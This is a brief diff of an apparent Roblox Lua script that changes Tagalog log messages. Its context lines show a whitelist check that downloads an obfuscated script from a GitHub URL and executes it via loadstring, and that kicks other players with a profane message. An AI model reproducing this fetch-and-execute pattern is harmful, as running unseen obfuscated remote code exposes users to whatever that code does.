@@ -45,9 +45,9 @@ local function sendLog(status)
 end
 
 if isWhitelisted then
-    sendLog("PASOK")
+    sendLog("HINDI KUMAG")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dezqpal/Primo/refs/heads/main/KAINOobsfucator.lua "))() 
 else
-    sendLog("NAGTANGKA")
+    sendLog("KUMAG!!!")
     player:Kick("ARAYMO PAKAK PAKYU!!")
 end
